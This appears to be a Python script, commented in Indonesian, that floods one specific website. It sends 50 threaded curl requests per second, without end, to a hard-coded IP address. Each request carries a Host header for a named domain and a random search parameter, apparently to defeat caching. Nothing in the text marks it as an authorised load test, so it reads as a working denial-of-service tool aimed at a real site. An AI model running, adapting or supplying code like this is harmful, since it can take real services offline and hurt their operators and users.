import subprocess
import threading
import time
import random
import string

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def run_curl(index):
    rand = random_string()
    url = f"http://153.92.9.237/?s={rand}"
    cmd = [
        "curl",
        "-s",
        "-L",
        "-H", "Host: bisinisia.id",
        url
    ]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        print(f"[{index}] Status: {result.returncode}")
    except Exception as e:
        print(f"[{index}] Error: {e}")

def run_50_curl_per_second():
    counter = 0
    while True:
        threads = []
        start = time.time()
        for i in range(50):
            counter += 1
            t = threading.Thread(target=run_curl, args=(counter,))
            t.start()
            threads.append(t)
        # Tunggu semua selesai
        for t in threads:
            t.join()
        elapsed = time.time() - start
        sleep_time = max(0, 1 - elapsed)
        time.sleep(sleep_time)  # Jaga agar tepat 1 detik per batch

if __name__ == "__main__":
    run_50_curl_per_second()
